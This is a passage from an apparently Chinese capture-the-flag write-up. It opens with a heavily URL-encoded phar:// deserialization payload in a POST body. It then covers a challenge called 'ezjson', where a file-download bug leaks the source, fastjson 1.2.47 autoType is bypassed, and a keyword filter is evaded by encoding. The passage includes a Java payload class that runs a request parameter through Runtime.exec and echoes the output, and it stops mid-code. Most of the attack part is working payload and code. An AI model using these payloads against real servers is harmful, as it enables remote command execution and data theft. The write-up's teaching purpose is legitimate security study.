POST:
    world=a=phar://hello.txt%26hello=%25%35%38%25%33%31%25%33%39%25%34%39%25%35%31%25%35%35%25%37%38%25%35%35%25%35%38%25%33%30%25%34%65%25%35%30%25%35%34%25%35%36%25%34%32%25%34%61%25%35%34%25%34%35%25%35%36%25%35%33%25%34%62%25%34%33%25%36%62%25%33%37%25%34%39%25%34%34%25%33%38%25%32%62%25%34%34%25%35%31%25%37%32%25%34%36%25%34%31%25%35%31%25%34%31%25%34%31%25%34%31%25%35%31%25%34%31%25%34%31%25%34%31%25%34%32%25%34%35%25%34%31%25%34%31%25%34%31%25%34%31%25%34%32%25%34%31%25%34%31%25%34%31%25%34%31%25%34%31%25%34%31%25%34%33%25%35%30%25%34%31%25%35%31%25%34%31%25%34%31%25%35%34%25%37%61%25%36%66%25%37%39%25%34%65%25%37%61%25%36%66%25%36%39%25%36%34%25%34%37%25%36%38%25%37%30%25%36%32%25%36%64%25%37%34%25%36%33%25%36%33%25%34%38%25%34%61%25%37%36%25%35%39%25%33%32%25%35%36%25%37%61%25%36%33%25%33%31%25%37%38%25%37%37%25%36%31%25%35%38%25%34%32%25%36%63%25%36%33%25%33%31%25%37%38%25%35%38%25%36%31%25%35%37%25%33%35%25%36%62%25%36%32%25%33%33%25%36%34%25%37%61%25%34%39%25%36%61%25%36%66%25%37%38%25%34%66%25%36%65%25%37%34%25%37%61%25%34%66%25%36%61%25%34%64%25%33%30%25%34%66%25%36%39%25%34%39%25%34%31%25%36%34%25%34%37%25%36%38%25%37%30%25%36%32%25%36%64%25%37%34%25%36%33%25%36%33%25%34%38%25%34%61%25%37%36%25%35%39%25%33%32%25%35%36%25%37%61%25%36%33%25%33%31%25%37%38%25%37%37%25%36%31%25%35%38%25%34%32%25%36%63%25%36%33%25%33%31%25%37%38%25%35%38%25%36%31%25%35%37%25%33%35%25%36%62%25%36%32%25%33%33%25%36%34%25%37%61%25%34%31%25%34%37%25%35%61%25%37%30%25%36%32%25%34%37%25%35%36%25%37%61%25%34%39%25%36%61%25%37%34%25%36%38%25%34%66%25%36%61%25%34%35%25%33%36%25%36%35%25%33%32%25%36%62%25%33%36%25%34%64%25%34%34%25%37%34%25%35%30%25%34%66%25%36%61%25%34%35%25%33%33%25%34%66%25%36%39%25%34%61%25%33%30%25%36%31%25%34%37%25%36%63%25%37%35%25%36%31%25%33%31%25%37%38%25%37%34%25%36%32%25%33%32%25%35%32%25%36%63%25%36%32%25%34%36%25%37%38%25%35%31%25%36%31%25%35%38%25%35%61%25%37%36%25%36%34%25%34%33%25%34%39%25%33%36%25%34%64%25%36%61%25%37%30%25%33%37%25%36%33%25%37%61%25%36%66%25%33%35%25%34%66%25%36%39%25%34%39%25%34%31%25%34%62%25%36%37%25%34%32%25%36%38%25%36%33%25%34%38%25%34%32%25%36%63%25%36%32%25%36%64%25%35%31%25%36%39%25%34%66%25%33%32%25%34%35%25%33%36%25%34%64%25%35%34%25%37%30%25%33%37%25%36%33%25%37%61%25%36%66%25%37%61%25%34%66%25%36%39%25%34%61%25%37%33%25%36%31%25%35%37%25%33%34%25%36%39%25%34%66%25%33%32%25%34%35%25%33%36%25%34%64%25%36%61%25%37%30%25%33%37%25%36%31%25%35%34%25%36%66%25%37%37%25%34%66%25%33%33%25%34%64%25%33%36%25%34%66%25%34%34%25%36%66%25%36%39%25%35%39%25%33%32%25%34%36%25%37%33%25%35%39%25%37%39%25%33%35%25%36%63%25%36%35%25%34%37%25%35%35%25%36%39%25%34%66%25%33%32%25%36%62%25%33%36%25%34%64%25%35%34%25%37%34%25%37%61%25%34%66%25%36%61%25%35%31%25%33%36%25%34%39%25%36%64%25%34%65%25%36%38%25%36%32%25%34%37%25%34%64%25%36%39%25%34%66%25%33%33%25%33%31%25%33%39%25%36%33%25%37%61%25%36%66%25%37%38%25%34%65%25%37%61%25%36%66%25%36%39%25%34%31%25%34%38%25%35%32%25%36%66%25%36%31%25%35%37%25%33%35%25%37%32%25%35%38%25%34%35%25%33%31%25%37%36%25%35%61%25%34%37%25%35%36%25%37%33%25%34%31%25%34%37%25%35%32%25%36%38%25%36%34%25%34%37%25%34%35%25%36%39%25%34%66%25%33%32%25%34%35%25%33%36%25%34%64%25%35%34%25%37%30%25%33%37%25%36%33%25%37%61%25%36%66%25%37%61%25%34%66%25%36%39%25%34%61%25%37%33%25%36%31%25%35%37%25%33%34%25%36%39%25%34%66%25%33%30%25%33%38%25%33%36%25%34%64%25%35%34%25%34%64%25%33%36%25%34%39%25%36%65%25%35%32%25%36%66%25%36%31%25%35%37%25%33%35%25%37%32%25%35%38%25%34%36%25%34%61%25%36%63%25%36%33%25%35%38%25%35%36%25%36%63%25%36%33%25%33%33%25%35%31%25%36%39%25%34%66%25%36%61%25%34%64%25%33%36%25%36%35%25%33%33%25%34%64%25%33%36%25%34%65%25%37%61%25%36%66%25%36%39%25%34%31%25%34%33%25%36%66%25%34%31%25%36%31%25%34%37%25%33%39%25%37%36%25%36%31%25%37%39%25%34%39%25%33%37%25%35%39%25%35%34%25%36%66%25%37%38%25%34%66%25%36%65%25%37%34%25%37%61%25%34%66%25%36%61%25%36%33%25%33%36%25%34%39%25%36%65%25%35%61%25%37%30%25%36%33%25%33%32%25%36%63%25%36%39%25%36%32%25%34%37%25%35%35%25%36%39%25%34%66%25%33%32%25%34%35%25%33%36%25%34%64%25%36%61%25%37%30%25%33%37%25%36%31%25%35%34%25%36%66%25%37%37%25%34%66%25%33%33%25%34%39%25%33%36%25%34%66%25%35%34%25%37%34%25%37%30%25%34%66%25%36%61%25%34%35%25%33%37%25%36%33%25%37%61%25%36%66%25%33%32%25%34%66%25%36%39%25%34%61%25%37%30%25%36%33%25%33%30%25%34%36%25%37%31%25%35%39%25%35%38%25%36%37%25%36%39%25%34%66%25%33%33%25%33%31%25%33%39%25%36%33%25%37%61%25%36%66%25%33%35%25%34%66%25%36%39%25%34%39%25%34%31%25%34%62%25%36%37%25%34%32%25%36%64%25%36%31%25%35%37%25%37%38%25%33%30%25%35%61%25%35%38%25%34%39%25%36%39%25%34%66%25%33%33%25%34%64%25%33%36%25%34%65%25%36%61%25%36%66%25%36%39%25%36%33%25%33%33%25%36%63%25%37%61%25%36%34%25%34%37%25%35%36%25%37%34%25%34%39%25%36%61%25%37%34%25%37%61%25%34%66%25%36%61%25%36%62%25%33%36%25%34%39%25%36%37%25%34%31%25%37%31%25%34%31%25%34%37%25%34%65%25%37%36%25%36%32%25%36%64%25%35%61%25%37%30%25%35%61%25%37%39%25%34%39%25%33%37%25%35%39%25%35%34%25%36%66%25%37%38%25%34%66%25%36%65%25%37%34%25%37%61%25%34%66%25%36%61%25%36%37%25%33%36%25%34%39%25%36%65%25%35%61%25%36%38%25%36%33%25%36%63%25%33%39%25%36%38%25%36%31%25%36%64%25%34%36%25%33%34%25%34%39%25%36%61%25%37%34%25%37%61%25%34%66%25%36%61%25%34%64%25%33%36%25%34%39%25%36%64%25%37%38%25%37%30%25%36%32%25%36%39%25%34%39%25%33%37%25%36%36%25%35%38%25%33%31%25%33%39%25%36%36%25%35%38%25%33%31%25%33%39%25%34%33%25%34%31%25%34%31%25%34%31%25%34%31%25%34%38%25%35%32%25%36%63%25%36%33%25%33%33%25%35%31%25%37%35%25%36%34%25%34%38%25%36%38%25%33%30%25%34%33%25%34%31%25%34%31%25%34%31%25%34%31%25%34%32%25%35%30%25%37%37%25%36%65%25%35%37%25%34%35%25%34%39%25%34%31%25%34%31%25%34%31%25%34%31%25%33%31%25%33%34%25%35%35%25%36%63%25%34%65%25%37%32%25%35%39%25%34%32%25%34%31%25%34%31%25%34%31%25%34%31%25%34%31%25%34%31%25%34%31%25%34%31%25%36%34%25%33%32%25%33%39%25%37%61%25%36%31%25%34%37%25%36%63%25%37%33%25%36%32%25%36%65%25%34%34%25%34%38%25%34%66%25%37%38%25%36%62%25%37%34%25%35%35%25%35%36%25%36%34%25%36%37%25%34%65%25%36%31%25%34%35%25%36%31%25%37%37%25%37%61%25%36%64%25%34%33%25%36%34%25%37%31%25%34%62%25%37%39%25%36%32%25%37%33%25%34%33%25%35%34%25%34%34%25%37%37%25%34%39%25%34%31%25%34%31%25%34%31%25%34%32%25%34%38%25%35%31%25%36%62%25%33%31%25%34%33%25%30%61
## **ezjson**
    任意文件下载 file=/proc/self/fd/5 获得源码
有一个fastjson反序列化入口
    @ResponseBody 
    @RequestMapping({"/json"}) 
    public String hello(HttpServletRequest request, HttpServletResponse response) { 
        String Poc = request.getParameter("Poc"); 
        if (Poc != null) { 
                String pattern = ".*Exec.*|.*cmd.*";   /
                boolean isMatch = Pattern.matches(pattern, Poc);
            if (isMatch) { 
                return "No way!!!"; 
            } else { 
                JSON.parse(Poc); 
                return Poc; 
            } 
        } else { 
          return "readme"; 
        } 
    }
fastjson版本为1.2.47,需要我们绕过autoType,然后去触发我们的App.Exec#getFlag(),其中正则用编码进行绕过
    public String getFlag() throws Exception { 
        Exec defineclass = new Exec(this.getClass().getClassLoader()); 
        Class clazz = defineclass.defineClass((String)null, this.ClassByte, 0, 
        this.ClassByte.length); 
        Method exec = clazz.getMethod("Exec", String.class); 
        Object Obj = clazz.newInstance(); 
        exec.invoke(Obj, this.cmd); 
        return this.flag; 
    }
因为用的是parse来进行反序列化,可以用$ref来调用getter,也可以通过su18师傅的方法
题目没有出网,构造命令回显(也可以写文件,然后通过最开始的文件下载获取flag)
    import org.springframework.web.context.request.RequestContextHolder;
    import org.springframework.web.context.request.ServletRequestAttributes;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    import java.io.BufferedReader;
    import java.io.IOException;
    import java.io.InputStreamReader;
    import java.io.UnsupportedEncodingException;
    public class payload{
        static {
            HttpServletRequest request =((ServletRequestAttributes) RequestContextHolder.getRequestAttributes()).getRequest();
            HttpServletResponse response = ((ServletRequestAttributes) RequestContextHolder.getRequestAttributes()).getResponse();
            String resHeader=request.getParameter ( "cmd" );
            java.io.InputStream in = null;
            try {
                in = Runtime.getRuntime().exec(resHeader).getInputStream();
            } catch (IOException e) {
                e.printStackTrace();
            }
            BufferedReader br = null;
            try {
                br = new BufferedReader (new InputStreamReader(in, "GBK"));
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            }
            String line = null;
            StringBuilder sb = new StringBuilder();
            while (true) {
                try {
                    if (!((line = br.readLine()) != null)) break;
                } catch (IOException e) {
                    e.printStackTrace();
                }
                sb.append(line);
                sb.append("\n");
            }
            java.io.PrintWriter out = null;
            try {
                out = new java.io.PrintWriter(response.getOutputStream());
            } catch (IOException e) {